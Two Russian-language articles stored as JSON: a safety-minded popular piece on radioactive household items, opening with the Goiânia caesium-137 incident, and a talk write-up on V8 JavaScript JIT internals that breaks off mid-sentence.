[{"header": "Радиоактивные предметы среди нас", "text": "Длинный пролог\r\n13 сентября 1987 года в жарком бразильском городе Гойяния произошла мелкая кража. Двое мужчин по имени Роберто Алвес и Вагнер Перейра, воспользовавшись отсутствием охраны, пробрались в заброшенный больничный корпус. Разобрав на металлолом странную медицинскую установку, они погрузили детали в тачку и покатили ее домой к Алвесу. Никто не знал, что это начало самого пугающего инцидента с радиоактивными материалами в гражданской сфере.\r\n\r\nДа, сотрудники Гойянского Института радиотерапии были в курсе, что при переезде в новое здание установленный в 1977 году громоздкий аппарат лучевой терапии остался на прежнем месте. Но собственник здания открыл имущественный спор с организацией. В дело вступили страховщики, при поддержке полиции запретившие вывозить оставшееся оборудование. На это один из совладельцев Института, Карлос Фигуеиредо Безеррил, только сказал напоследок, что на президенте страховой компании Лисио Боргесе будет лежать ответственность за то, что произойдет с «цезиевой бомбой».\r\n\r\nА цезиевая бомба, точнее — источник гамма-излучения в виде изотопа цезия-137, помещенного в капсулу с излучающим окошком и смонтированного в аппарате радиотерапии, в течение четырех месяцев пылилась в покинутом здании, пока ее не свинтили оттуда двое друзей-мародеров. Тем же вечером они приступили к разборке подвижной головки прибора, откуда в конце концов ими была извлечена злополучная капсула. Немного поблевав, друзья разошлись по своим делам: Перейра все же обратился в госпиталь, где ему диагностировали пищевое отравление, а Алвес на следующий день продолжил разборку капсулы. Несмотря на полученные непонятные ожоги, 16 сентября он успешно проковырял в окошке капсулы отверстие и вынул на кончике отвертки странный светящийся порошок. Попытавшись его поджечь, он в дальнейшем потерял интерес к капсуле и продал ее на свалку человеку по имени Девейр Феррейра.\r\n\r\nНочью 18 сентября Феррейра увидел таинственный синий свет, исходящий от капсулы. Восхитившись невероятным феноменом, он тут же притащил столь замечательную вещь себе домой. Там он демонстрировал светящуюся капсулу своим родственникам и друзьям. Один из друзей 21 сентября доломал окошко капсулы, вытащив наружу несколько гранул вещества. Никто из них не знал, какой ящик Пандоры был ими взломан. Хлорид цезия-137 стал в буквальном смысле ходить по рукам.\r\n24 сентября брат Феррейры Айво утащил светящийся порошок к себе домой, рассыпав его на бетонный пол. Его шестилетняя дочь ползала по этому полу, жуя бутерброд и с восторгом обмазываясь необычным светящимся веществом…\r\nПараллельно с этим жена Феррейры Габриэла серьезно заболела. 25 сентября тот взял странную капсулу и перепродал ее на соседний разбор металлолома.\r\nОднако Габриэла оказалась настоящей героиней в этой истории. Уже получив смертельную дозу радиации в 5,7 Грей, она сопоставила свое заболевание, похожие недомогания у знакомых и странную вещь, принесенную мужем. 28 сентября она нашла в себе силы пойти на вторую свалку, вытащить злополучную капсулу и вместе с ней поехать в больницу. В больнице, конечно, пришли в ужас, быстро распознав назначение странной детали, но к счастью, женщина упаковала фонивший материал и заражение в больнице оказалось незначительным. Габриэла умерла 23 октября в один день с маленькой племянницей Феррейры. Кроме них умерли еще двое работников свалки, раскурочивших капсулу до конца.\r\nМАГАТЭ назвало инцидент в Гойянии самым кошмарным радиационным инцидентом в мире. Только по благоприятному стечению обстоятельств последствия оказались локальными, но потенциально они могли затронуть огромное количество людей в густонаселенном городе. Всего заражены оказались 249 человек, 42 здания, 14 машин, 3 куста, 5 свиней и 50000 рулонов туалетной бумаги. Власти вывезли с мест заражения верхний слой почвы и почистили территорию ионообменными реагентами. Маленькую дочь Айво пришлось хоронить в герметичном гробу под протесты местных жителей, не желавших захоронения ее радиоактивного тела на кладбище.\r\n\r\nВ том же году мальчик из Мичигана по имени Дэвид Хан получил на десятый день рождения том «The Golden Book of Chemistry Experiments», который сделает его одиозным авантюристом, известным как «Радиоактивный Бойскаут». Количество радиоактивных веществ, которое он наковырял из самых разных предметов, причем совершенно сознательно, поражает воображение. Торий, америций, тритий, радий и даже собственноручно собранный ядерный реактор из этих материалов — то, к чему он навязчиво стремился всю свою жизнь. \r\nЭти примеры показывают, что на самом деле в нашем быту до сих пор остается множество различных предметов, которые могли раньше считаться вполне безопасными, либо считались безопасными в руках специалистов, но из этих рук пошли гулять по другим, либо по какой-то причине оказались заброшенными, украденными и так далее.\r\n\r\nВ принципе об этих предметах дает представление Интернет в виде обсуждений на специализированных форумах, зачастую эпичных по объему и с весьма говорящим названием. Но все же я решил более-менее классифицировать все те высокоэнергетические предметы, которые до сих пор в ходу в нашем мире, чтобы люди не слишком восхищались разного рода свечением, не брали в руки странные штуковины с окошками и не сдавали их на металлолом (наверное, вообще худшее, что можно сделать!).\r\n\r\n\r\nРадиоактивная лечебная вода Radithor, выпускалась в США в 1918-1928 гг\r\n\r\nСветомасса постоянного действия\r\nТаким словосочетанием обозначается постоянно фосфоресцирующий состав, наносимый на все, что нужно видеть в темноте. До эры светодиодов, миниатюрных качественных лампочек и надежных элементов питания подсветить какую-нибудь шкалу прибора лампочкой было ненадежно. Куда как более дешево и безотказно действует светящаяся несколько десятилетий подряд краска. Достаточно нанести краску на стрелки аналоговых (а других и не было) приборов, выполнить ей деления шкал — и прибор становится читаемым днем и ночью. Самым, наверное, знакомым для людей моего поколения таким прибором является популярный советский компас Андрианова:\r\n\r\n\r\nНу а в целом, очень многие вещи военного назначения, «старой закалки», выполнялись с помощью радиоактивной краски. Часы, водолазные часы, шкалы с приборных досок военной техники. Все это выполнено светящейся зеленым краской на основе радия-226. В основном это все-таки касается авиации и флота, причем середины ХХ века. Поэтому если вы коллекционируете подобные предметы, восстанавливаете ретро-технику, помните: женщины, наносившие эту краску на стрелки приборов в военное время, страдали от серьезных проблем со здоровьем. Вам это не нужно.\r\n\r\nАвиационные приборы с радиевой краской на шкалах\r\n\r\nКонечно, такие количества краски, которую вы не наносите сами, а всего лишь наблюдаете уже на излете ее активности, дают минимальное излучение, но я вот как-то морщусь, вспоминая детский восторг от близко поднесенного к лицу фосфоресцирующего компаса. Ну а если краска уже облупляется, то дышать такими микрочастицами вообще точно не стоит.\r\n\r\nСегодня радиевая краска запрещена уже почти полвека, а в состав СПД теперь входит тритий. Он считается более безопасным, хотя и сложен в получении. Ежегодно производится около 400 г трития, причем стоимость доходит до $30000 за грамм.\r\n\r\nМинералы\r\nНеобязательно работать на урановых рудниках для облучения себя повышенным фоном. Обычные граниты тоже могут давать превышение естественного фона. Все зависит от конкретного состава минералов.\r\nВ России, на границе Иркутской области и Якутии, существует единственное в мире месторождение чароита — минерала с уникальным сиреневым цветом. Квота на добычу этого камня установлена республикой Саха-Якутия всего в 100 тонн в год. Поэтому изделия из него постоянно дорожают. Однако помимо марганца, дающего характерную окраску, в жилах могут содержаться примеси редкоземельных элементов и тория. Эти примеси могут давать сырью существенный фон. Маловероятно, но не исключено, что изделие из такого камня окажется неприятным источником излучения.\r\nСуществуют, однако, гораздо более популярные, ныне уже не выпускаемые по объективным причинам, но все еще ходящие по рукам коллекционеров бытовые предметы из уранового стекла — вполне говорящее название, правда? Оно изготавливалось добавлением в стекло оксидов урана или ураната натрия. Помимо красивого зеленого цвета, предметы, отлитые из него, могут также испускать великолепное зеленое свечение под действием ультрафиолета. Изделия, изготовленные в СССР, обычно матово-зеленые либо коричневые, а сделанные в Европе — полупрозрачные, и называются на американском английском vaseline glass.\r\n\r\nИзделия из уранового стекла. Фото: лот ebay\r\n\r\nВы вполне можете вбить это словосочетание в поиске на ebay, и получите множество симпатичных и забавных сувениров из этого материала, испускающего множество быстрых и веселых бета-частиц. Энергия такого излучения невысока, но лучше любоваться этими вещами из-за стекла, а не держать на обеденном столе.\r\n\r\nКонфетница в виде головы добермана, урановое стекло. Фото: лот ebay\r\n\r\nТорий кроется в деталях\r\nТакже вам могут встретиться в жизни некоторые неприятные торированные предметы. Упоминавшийся «Радиоактивный Бойскаут» активно (извините за каламбур) использовал в своих опытах калильные сетки туристических ламп. Удобная вещь, умеющая превращать нагревание топливом в свет посредством эффекта кандолюминесценции — переизлучения тепла в видимый спектр. Уже не выпускаются, но все еще продаются. Химик Карл Ауэр фон Вельсбах установил а начале ХХ века, что оптимальным составом для калильных сеток является 99% тория к 1% церия. Очень малоприятный состав, да еще для раскаленного добела сплава.\r\n\r\nТорий могут также содержать некоторые вольфрамовые электроды. Если когда-либо придется с такими работать — обратите внимание на красную маркировку, и имейте в виду, что часть перегретого при сварке материала испаряется.\r\n\r\n\r\nОтдельная проблема с торием лежит в области раритетной фототехники. Существует большое количество моделей старых объективов с торированной оптикой. Торирование использовалось в качестве просветляющего напыления до 1970-х годов. \r\nСписок торированных объективовSuper Takumar 35/2 (V2, 49mm filter) introduced 1968\r\nS-M-C Takumar 35/2 1972\r\nSuper Takumar 50/1.4 (V2) 1967\r\nS-M-C Takumar 50/1.4 1971\r\nSuper and S-M-C Takumar 6X7 105/2.4 1969\r\nKodak Ektar 101mm f/4.5 (Miniature Crown Graphic camera) lens mfg. 1946\r\nKodak Ektar 38mm f/2.8 (Kodak Instamatic 814 camera) lens mfg 1968—1970\r\nKodak Ektanar 50mm f/2.8 (Kodak Signet 80 camera) lens mfg. 1958—1962 (3 examples)\r\nKodak Ektanar 90mm f/4 (Kodak Signet 80 camera) lens mfg. 1958—1962\r\nKodak Ektanar, 44mm f/2.8 (Kodak Signet 30, Kodak Signet 50, Kodak Automatic 35/Motormatic 35 cameras) lenses mfg. 1959—1969\r\nKodak Ektanon 50mm f/3.9 (Kodak Bantam RF camera) lens mfg. 1954—1957\r\nKodak Ektanon 46mm f/3.5 (Kodak Signet 40 camera) lens mfg. 1956—1959\r\nKodak Anastar 44mm f/3.5 (Kodak Pony IV camera)\r\nKodak Color Printing Ektar 96mm f/4.5 lens mfg. 1963\r\nПРЕДПОЛОЖИТЕЛЬНО ТАКЖЕ \r\nCanon FL 58mm f/1.2\r\nCanon FD 35mm f/2.0 (versions from the early 1970's)\r\nCanon FD 55mm f/1.2 S.S.C. Aspherical\r\nCarl Zeiss Jena Pancolar 55mm f1.4 (measured at 2360 nSv/h)\r\nCarl Zeiss Jena Pancolar 50mm f1.8 «Zebra»\r\nCarl Zeiss Jena Biometar 80mm f2.8 «Zebra» \"(Only P6 mount version )\r\nCarl Zeiss Jena Flektogon 50mm f4 «Zebra» \"(Only P6 mount version )\r\nGAF Anscomatic 38mm f/2.8 (GAF Anscomatic 726 camera)\r\nIndustar 61 L/Z MC (desert_beaver пишет в комментариях, что использовавшийся вместо тория лантан все же безопаснее)\r\nKodak Aero-Ektars (various models)\r\nKodak Ektanon 50mm f/3.9 (Kodak Bantam RF camera)\r\nNikkor 35mm f/1.4 (early variant with thorium glass elements)\r\nOlympus Zuiko Auto-S 1:1,2/55 mm (first version with thorium glass elements)\r\nOlympus Zuiko Auto-S 1:1,4/50 mm (only first version «Silvernose» is Radioactive)\r\nPentax Super Takumar 35mm f/2 (Asahi Optical Co.)\r\nPentax Super Takumar 50mm f/1.4 (Asahi Optical Co.)\r\nSMC Takumar 35mm f/2.0 (Asahi Optical Co.)\r\nSuper Takumar 35mm f/2.0 (Asahi Optical Co.)\r\nSMC Takumar 50mm f/1.4 (Asahi Optical Co.)\r\nSuper Takumar 50mm f/1.4 (Only latest Version 2)\r\nSMC Takumar 55mm f/1.8 (Asahi Optical Co.)\r\nSuper Takumar 6×7 105mm f2.4 (Asahi Optical Co.)\r\nYashinon-DS 50mm f1.7 (Yashica)\r\nYashinon 55mm f1.2 (Tomioka)\r\nLeitz Wetzlar Summicron 5cm f/2.0 (M39)\r\nVivitar Series 1 28mm F1.9\r\n\r\nИсточник (опять каламбур, извините)\r\n\r\n\r\nСпециально созданные источники радиации\r\nЕсли все предыдущее было недоразумением технологий первой половины XX века, когда еще не такое большое значение придавали радиоактивности предметов, то следующие устройства представляют серьезнейшую опасность и по идее вообще не должны попадаться вам в быту и вообще в какие-либо не те руки. Это — штатные источники излучения, находящиеся в специальных приборах и устройствах. Если вы нашли что-то подобное и не умеете с ним обращаться — вызывайте МЧС и не дожидайтесь наступления вашего персонального Чернобыля.\r\n\r\nГамма-источники используются в качестве уровнемеров в каменоломнях и карьерах, в гамма-дефектоскопии и прочей промышленности.\r\n\r\nСходный принцип действия с уровнемерами и у датчиков дыма. Радиоактивный источник постоянно облучает датчик напротив. Дым (твердые частицы) ослабляет поток, что замечается датчиком, и включается тревога. В датчиках дыма используется изотоп америция-241, хотя в старых советских РИД-1 применялся аж плутоний-239. Разбирать их или тем более выкидывать в мусор крайне не рекомендуется.\r\n\r\nДатчики РИД-1\r\n\r\nИ снова тот же самый принцип. Есть толщина чего-то, которая перекрывает путь ионизирующему излучению. На покрытом радиевой СПД табло загорается тревожная лампочка: «обледенение». На фото — датчик обледенения РИО-3, на отечественной авиации получил широкое распространение, поэтому вполне может внезапно встретиться на заброшенных аэродромах, военных базах тем, кто залезет туда посталкерить, с плачевными последствиями: \r\n\r\n\r\nДопустим, прочитав эту статью, вы запаниковали и побежали сталкерить покупать недорогой и сердитый армейский или геологический дозиметр на Авито. Тем самым вы приобретаете и невзрачный, маленький, но совсем не безобидный контрольный источник, для калибровки прибора:\r\n\r\nИсточник источника\r\n\r\nЭто тоже радиоактивный источник, вполне серьезный и опасный для здоровья, несмотря на свою миниатюрность. Его нельзя терять, ломать, давить или выкидывать.\r\n\r\nЕсли вы думаете, что целью статьи было показать, как страшно жить — вовсе нет. Попробуйте посмотреть на это с другой стороны: вы предупреждены, и теперь не будете покупать для своих проектов на ардуино стильные аналоговые циферблаты от авиационных и флотских приборных панелей, поостережетесь сваривать ториевыми электродами и фотографировать на просветленный винтажный объектив. И тем более, чтобы заработать на все это денег — не потащите в металлолом найденный на каком-то заброшенном заводе пузатый гамма-источник с проушиной сверху.", "images": [{"img": "https://habrastorage.org/webt/tr/du/ew/trduewyrsagnoihngwpc38r3f00.jpeg"}, {"img": "https://habrastorage.org/webt/cq/hp/m5/cqhpm5cgeoiybdtmk-l6oaptl-g.jpeg"}, {"img": "https://habrastorage.org/webt/mp/kx/mt/mpkxmtufkxgx74nm92dtrwfq9qe.jpeg"}, {"img": "https://habrastorage.org/webt/pe/s3/xr/pes3xre5eojdrlohotq1pys2p_m.jpeg"}, {"img": "https://habrastorage.org/webt/6k/8d/8l/6k8d8lsplso02aozwclf5nnlmxc.jpeg"}, {"img": "https://habrastorage.org/webt/dh/zr/do/dhzrdo4gaqwnwpatiishcsiepqs.jpeg"}, {"img": "https://habrastorage.org/webt/xy/aw/ls/xyawlsjnwrx532jcsqvwxozmzym.jpeg"}, {"img": "https://habrastorage.org/webt/bu/kk/8w/bukk8wy8wtz6pm3nulsb3aene0m.jpeg"}, {"img": "https://habrastorage.org/webt/ym/kh/pv/ymkhpvwtbowrwg_ydoywzxyessu.jpeg"}, {"img": "https://habrastorage.org/webt/er/ru/rz/errurzievxlpbwjpbodye8roxr0.jpeg"}]}, {"header": "Знай свой JIT: ближе к машине", "text": "До того, как написанный нами код будет исполнен, он проходит довольно долгий путь. Андрей Мелихов в своем докладе на РИТ++ 2018 разобрал каждый шаг на этом пути на примере движка V8. Заходите под кат, чтобы выяснить, что даёт нам глубокое понимание принципов работы компилятора и как сделать JavaScript код производительнее.\r\n\r\n\r\n\r\nУзнаем, является ли WASM серебряной пулей для повышения производительности кода, и всегда ли оправданы оптимизации.\r\n\r\nСпойлер: «Преждевременная оптимизация — корень всех бед», Дональд Кнут.\r\n\r\n\r\n\r\nО спикере: Андрей Мелихов работает в компании Яндекс.Деньги, активно пишет на Node.js, а в браузере — меньше, поэтому ему ближе серверный JavaScript. Андрей поддерживает и развивает сообщество devShacht, заходите познакомиться на GitHub или Medium.\r\n\r\nМотивация и глоссарий\r\nСегодня мы будем говорить про JIT компиляцию. Думаю, вам это интересно, раз вы это читаете. Тем не менее, давайте уточним, зачем нужно знать, что такое JIT и как устроен V8, и почему недостаточно писать на React в браузере.\r\n\r\n\r\nПозволяет писать более эффективный код, потому что язык у нас специфичный.\r\nРаскрывает загадки, почему в чужих библиотеках код написан именно так, а не иначе. Иногда мы сталкиваемся со старыми библиотеками и видим, что там написано как-то странно, а нужно это, не нужно — непонятно. Когда знаешь, как это работает, то понимаешь, зачем это было сделано.\r\n\r\nЭто просто интересно. К тому же позволяет понять, о чём общаются в твиттере Аксель Раушмайер, Бенедикт Мойрер и Дэн Абрамов.\r\n\r\n\r\n\r\n\r\nВ Википедии написано, что JavaScript — это высокоуровневый интерпретируемый язык программирования с динамической типизацией. Разберемся с этими терминами.\r\n\r\nКомпиляция и интерпретация\r\n\r\nКомпиляция — когда программа поставляется в бинарном коде, и изначально оптимизирована под среду, в которой будет работать.\r\n\r\nИнтерпретация — когда мы поставляем код, как есть.\r\n\r\nJavaScript поставляется, как есть — это интерпретируемый язык, как и написано в Википедии.\r\n\r\nДинамическая и статическая типизация\r\n\r\nСтатическую и динамическую типизации часто путают со слабой и сильной типизацией. Например, С — это язык со статической слабой типизацией. У JavaScript слабая динамическая типизация.\r\n\r\nЧто из этого лучше? Если программа компилируется, она заточена на ту среду, в которой будет исполняться, а значит —будет работать лучше. Статическая типизация позволяет сделать этот код эффективнее. В JavaScript все наоборот.\r\n\r\nНо при этом наше приложение становится все сложнее: и на клиенте, и на сервере появляются огромные кластеры на Node.js, которые прекрасно работают и приходят на замену Java-приложениям.\r\n\r\nНо каким образом это все работает, если изначально кажется, что оно в проигрыше.\r\n\r\nJIT всех примирит! Или хотя бы попытается.\r\nУ нас есть JIT (Just In Time компиляция), которая происходит во время выполнения программы. О ней и будем говорить.\r\n\r\nJS-движки\r\n\r\nВсеми нелюбимая Chakra, которая находится в Internet Explorer. Она даже работает не с JavaScript, а с Jscript — есть такое подмножество.\r\n\r\nСовременные Chakra и ChakraCore, которые работают в Edge;\r\n\r\nSpiderMonkey в FireFox;\r\nJavaScriptCore в WebKit. Также он используется в React Native. Если у вас RN-приложение под Android, то оно так же исполняется на JavaScriptCore — движок идёт в комплекте с приложением.\r\n\r\nV8 — мой самый любимый. Он не самый лучший, просто я работаю с Node.js, в котором это основной движок, как и во всех Chrome Based браузерах.\r\n\r\nRhino и Nashorn — это движки, которые используются в Java. С их помощью там тоже можно исполнять JavaScript.\r\n\r\nJerryScript — для встраиваемых устройств;\r\n\r\nи другие...\r\n\r\nВы можете написать свой движок, но если вы будете двигаться к эффективному исполнению, то придете примерно к одной и той же схеме, которую я дальше покажу.\r\n\r\nСегодня мы будем говорить о V8, и да, он назван в честь 8-цилиндрового двигателя.\r\n\r\nЛезем под капот\r\nКак исполняется JavaScript?\r\n\r\n\r\nЕсть код, написанный на JavaScript, который так и поставляется.\r\n\r\nон парсится;\r\nисполняется;\r\nполучается результат.\r\n\r\n\r\n\r\n\r\nПарсинг превращает код в абстрактное синтаксическое дерево. AST — это отображение синтаксической структуры кода в виде дерева. На самом деле это удобно для программы, хотя и тяжело читать.\r\n\r\n\r\nПолучение элемента массива с индексом 1 в виде дерева представляется в виде оператора и двух операндов: загрузить свойство по ключу и эти ключи.\r\n\r\nГде используется AST\r\nAST есть не только в движках. С использованием AST во многих утилитах пишутся расширения, в том числе:\r\n\r\n\r\nESLint;\r\nBabel;\r\nPrettier;\r\nJscodeshift.\r\n\r\nНапример, крутая штука Jscodeshift, про которую пока не все знают, позволяет писать преобразования. Если вы изменили API у какой-то функции, то можете натравить на нее эти преобразования и внести изменения во всем проекте.\r\n\r\n\r\n\r\nДвигаемся дальше. Процессор не понимает абстрактное синтаксическое дерево, ему нужен машинный код. Поэтому дальше происходит преобразование через интерпретатор, потому что язык интерпретируемый.\r\n\r\n\r\nТак было, пока браузерах было немного JavaScript — подсветить строчку, что-то открыть, закрыть. Но сейчас у нас приложения — SPA, Node.js, и интерпретатор становится узким местом.\r\n\r\nОптимизирующий JIT-компилятор\r\nВместо интерпретатора появляется оптимизирующий JIT-компилятор, то есть Just-in-time компилятор. Ahead-of-time компиляторы работают до исполнения приложения, а JIT — во время. В вопросе оптимизации JIT-компилятор пытается угадать, как код будет исполняться, какие будут использоваться типы, и оптимизировать код так, чтобы он лучше работал.\r\n\r\nТакая оптимизация называется спекулятивной, потому что она спекулирует на знаниях о том, что происходило с кодом раньше. То есть если 10 раз было вызвано что-то с типом number, компилятор думает, что так будет все время и оптимизирует под этот тип.\r\n\r\nЕстественно, если на вход попадает Boolean, происходит деоптимизация. Рассмотрим функцию, которая складывает числа.\r\n\r\nconst foo=(a, b) => a + b;\r\nfoo (1, 2);\r\nfoo (2, 3);\r\n\r\nСложили один раз, второй раз. Компилятор строит предсказание: «Это числа, у меня есть крутое решение для сложения чисел!» А вы пишете foo('WTF', 'JS'), и передаете в функцию строки  — у нас же JavaScript, мы можем и строку с числом сложить.\r\n\r\nВ этот момент происходит деоптимизация.\r\n\r\n\r\n\r\nИтак, интерпретатор заменился на компилятор. Кажется, что на схема выше очень простой pipeline. В реальности все немного иначе.\r\n\r\n\r\n\r\nТак было до прошлого года. В прошлом году вы могли слышать много докладов от Google о том, что они запустили новый pipeline с TurboFan и теперь схема выглядит проще.\r\n\r\n\r\n\r\nИнтересно, что здесь появился интерпретатор.\r\n\r\n\r\n\r\nИнтерпретатор нужен, чтобы превратить абстрактное синтаксическое дерево в байткод, и предать байткод в компилятор. В случае деоптимизации он опять идет в интерпретатор.\r\n\r\nИнтерпретатор Ignition\r\nРаньше в схеме интерпретатора Ignition не было. Google изначально говорили о том, что интерпретатор не нужен — JavaScript и так достаточно компактный и интерпретируемый — мы ничего не выиграем.\r\n\r\nНо команда, которая работала с мобильными приложениями, столкнулась со следующей проблемой.\r\n\r\n\r\n\r\nВ 2013-2014 году люди стали чаще использовать для выхода в интернет мобильные устройства, чем десктоп. В основном это не iPhone, а с устройств попроще — у них мало памяти и слабый процессор.\r\n\r\n\r\n\r\nВыше график первичного анализа 1 МБ кода до запуска интерпретатора. Видно, что десктоп выигрывает очень сильно. iPhone тоже неплох, но у него другой движок, а мы говорим сейчас о V8, который работает в Chrome.\r\n\r\nА вы знаете, что, если вы поставите Chrome на iPhone, он все равно будет работать на JavaScriptCore?\r\nТаким образом время тратится — и это только анализ, а не исполнение — ваш файл загрузился, и он пытается понять, что в нем написано.\r\n\r\n\r\nКогда происходит деоптимизация, нужно снова исходный взять код, т.е. его надо где-то хранить. На это уходило много памяти.\r\n\r\nТаким образом у интерпретатора было две задачи:\r\n\r\n\r\n уменьшить накладные расходы на парсинг;\r\n \r\n уменьшить потребление памяти.\r\n \r\n\r\nЗадачи были решены переходом на интерпретатор с байткодом.\r\n\r\n\r\nБайткод в Chrome — это регистровая машина с аккумулятором. В SpiderMonkey стековая машина, там все данные лежат на стеке, а регистров нет. Здесь они есть.\r\n\r\nНе будем полностью разбирать, как это работает, просто посмотрим на фрагмент кода.\r\n\r\n\r\n\r\nЗдесь написано: взять значение, которое лежит в аккумуляторе, и сложить со значением, которое лежит в регистре a0, то есть в переменной a. Здесь еще ничего не известно о типах. Если бы это был настоящий ассемблерный код, то он бы писался с пониманием того, какие есть сдвиги в памяти, что в ней находится. Здесь же просто инструкция — возьми то, что лежит в регистре a0 и сложи со значением, лежащим в аккумуляторе.\r\n\r\nКонечно, интерпретатор не просто берет абстрактное синтаксическое дерево и переводит его в байткод.\r\n\r\n\r\nЗдесь также происходят оптимизации, например, dead code elimination.\r\nЕсли участок кода не будет вызван, он выкидывается и дальше не хранится. Если Ignition увидит сложение двух чисел, он их сложит и оставит в таком виде, чтобы не хранить лишнюю информацию. Только после этого получается байткод.\r\n\r\n Оптимизации и деоптимизации \r\nХолодные и горячие функции\r\nЭто самая простая тема.\r\n\r\nХолодные функции — это те, которые вызывались один раз или не вызывались совсем, горячие — это те, которые вызывались несколько раз. Сколько именно раз, сказать нельзя — в любой момент это могут переделать. Но в какой-то момент функция становятся горячей, и движок понимает, что ее надо оптимизировать.\r\n\r\n\r\n\r\nСхема работы.\r\n\r\n\r\nIgnition (интерпретатор) собирает информацию. Он не только преобразует JavaScript в байткод, но еще и понимает, какие на вход пришли типы, какие функции стали горячими, и обо всем этом говорит компилятору.\r\nПроисходит оптимизация.\r\nКомпилятор исполняет код. Все работает хорошо, но тут прилетает тип, который он не ожидал, у него нет кода для работы с этим типом.\r\nПроисходит деоптимизация. Компилятор обращается к интерпретатору Ignition за этим кодом.\r\n\r\nЭто нормальный цикл, который происходит все время, но он не бесконечный. В какой-то момент движок говорит: «Нет, это невозможно оптимизировать», и начинает выполнять без оптимизации. Важно понимать, что нужно соблюдать мономорфность.\r\n\r\nМономорфность — это когда на вход вашей функции всегда приходят одни и те же типы. То есть если у вас все время приходит string, то не надо передавать туда boolean.\r\n\r\nНо что делать с объектами? Объекты все object. У нас есть классы, но ведь они не настоящие — это просто сахар над прототипной моделью. Но внутри движка есть так называемые скрытые классы.\r\n\r\nHidden classes\r\nСкрытые классы есть во всех движках, не только в V8. Везде они называются по-разному, в терминах V8 это Map.\r\n\r\nВсе объекты, которые вы создали, имеют скрытые классы. Если вы\r\nпосмотрите в профилировщик памяти, вы увидите, что там есть elements, где хранится список элементов, properties, где хранятся property, и map (обычно первым параметром), где указана ссылка на его на его скрытый класс.\r\n\r\nMap описывает структуру объектов, потому что в принципе в JavaScript типизация возможна только структурная, не номинальная. Мы можем описать, как выглядит наш объект, что за чем в нем идет.\r\n\r\nПри удалении/добавлении свойств объектов Hidden classes у объекта меняется, присваивается новый. Посмотрим на коде.\r\n\r\n\r\nУ нас есть конструктор, который создает новый объект типа Point.\r\n\r\n\r\nСоздаем объект.\r\nПривязываем к нему скрытый класс, который говорит, что это объект типа Point.\r\nДобавили поле x — новый скрытый класс, который говорит, что это объект типа Point, в котором первым идет значение x.\r\nДобавили y — новый Hidden classes, в котором x, а потом y.\r\nСоздали еще один объект — происходит то же самое. То есть он так же привязывает то, что уже создано. В этот момент эти два объекта имеют одинаковый тип (через Hidden classes).\r\nКогда во второй объект добавляется новое поле, у объекта появляется новый Hidden classes. Теперь для движка p1 и p2 это объекты разных классов, потому что у них разные структуры\r\nЕсли передать куда-то первый объект, то, когда вы передадите туда же второй, произойдет деоптимизация. Первый ссылается на один скрытый класс, второй — на другой.\r\n\r\nКак можно проверить Hidden classes?\r\n\r\nВ Node.js можно запустить node —allow-natives-syntax. Тогда вы получите возможность писать команды в специальном синтаксисе, который, конечно, нельзя использовать в продакшене. Это выглядит так:\r\n\r\n%HaveSameMap({'a':1}, {'b':1})\r\nНикто не гарантирует, что это завтра эти команды будут работать, их нет в спецификации ECMAScript, это всё для отладки.\r\n\r\nКак вы думаете, какой будет результат вызова функции %HaveSameMap для двух объектов. Правильный ответ — false, потому что у одного поле называется a, у второго — b. Это разные объекты. Это знание можно использовать для техники Inline Caches.\r\n\r\nInline Caches\r\nВызовем очень простую функция, которая возвращает поле из объекта. Кажется, вернуть единицу очень просто. Но если вы посмотрите спецификацию ECMAScript, вы увидите, что там огромный список того, что нужно сделать, чтобы получить поле из объекта. Потому что, если поля нет в объекте, возможно, оно есть в его прототипе. Может быть, это setter, getter и так далее. Все это нужно проверять.\r\n\r\n\r\nВ данном случае в объекте есть ссылка на map, которая говорит: чтобы получить поле x, нужно сделать смещение на единицу, и мы получим x. Никуда не надо лазить, ни в какие прототипы, все рядом. Inline Caches использует это.\r\n\r\n\r\n\r\n\r\nЕсли мы вызываем функцию первый раз, все хорошо, интерпретатор сделал оптимизацию\r\nДля второго вызова сохраняется мономорфное состояние.\r\nВызываю функцию третий раз, передаем чуть-чуть другой объект {x:3, y:1}. Происходит деоптимизация, появляется if, мы переходим в полиморфное состояние. Теперь код, который исполняет эту функцию, знает — ей на вход могут прилететь два разных типа объектов.\r\nЕсли мы несколько раз передаем разные объекты, он остается в полиморфном состоянии, добавляя новые if. Но в какой-то момент сдается и переходит в мегаморфное состояние, т.е. когда: «На вход прилетает слишком много разных типов — я не знаю, как это оптимизировать!»\r\n\r\nКажется, сейчас допускается 4 полиморфных состояний, но завтра их может быть 8. Это решают разработчики движка. Нам лучше оставаться в мономорфном, в крайнем случае, в полиморфном состоянии. Переход между мономорфным и полиморфным состояниями дорогой, потому что нужно будет сходить в интерпретатор, получить код заново и заново его оптимизировать.\r\n\r\nМассивы\r\nВ JavaScript, не считая специфичных Typed Arrays, есть один тип\r\nмассива. В движке V8 их 6:\r\n\r\n  1. [1, 2, 3, 4] // PACKED_SMI_ELEMENTS — просто упакованный массив small integer. Для него есть оптимизации.\r\n\r\n  2. [1.2, 2.3, 3.4, 4.6] // PACKED_DOUBLE_ELEMENTS — упакованный массив double элементов, для него тоже есть оптимизации, но более медленные.\r\n\r\n  3. [1, 2, 3, 4, ’X’] // PACKED_ELEMENTS — упакованный массив, в котором есть объекты, строки и все остальное. Для него тоже есть оптимизации.\r\n\r\nСледующие три типа — это массивы того же типа, что первые три, но с дырками:\r\n\r\n  4. [1, /*hole*/, 2, /*hole*/, 3, 4] // HOLEY_SMI_ELEMENTS\r\n\r\n  5. [1.2, /*hole*/, 2, /*hole*/, 3, 4] // HOLEY_DOUBLE_ELEMENTS\r\n\r\n  6. [1, /*hole*/, ’X’] // HOLEY_ELEMENTS\r\n\r\nКогда в ваших массивах появляются дырки, оптимизации становятся менее эффективными. Они начинают работать плохо, потому что невозможно подряд пройти по этому массиву, перебирая его итерациями. Каждый последующий тип хуже оптимизируется\r\n\r\n\r\n\r\nНа схеме все, что выше, быстрее оптимизируется. То есть все ваши нативные методы — map, reduce, sort — внутри хорошо оптимизированы. Но с каждым типом оптимизация становится хуже.\r\n\r\nНапример, на вход пришел простой массив [1, 2,3] (тип — упакованный small integer). Чуть-чуть изменили этот массив, добавив в него double — перешли в состояние PACKED_DOUBLE_ELEMENTS. Добавляем в него объект — перешли в следующее состояние, зеленый прямоугольник PACKED_ELEMENTS. Добавляем в него дырок — переходим в состояние HOLEY_ELEMENTS. Хотим восстановить его в предыдущее состояние, чтобы он снова стал «хорошим» — удаляем все, что написали, и остаемся в том же состоянии… с дырками! То есть HOLEY_ELEMENTS справа внизу на схеме. Назад это не работает. Ваши массивы могут становиться только хуже, но не 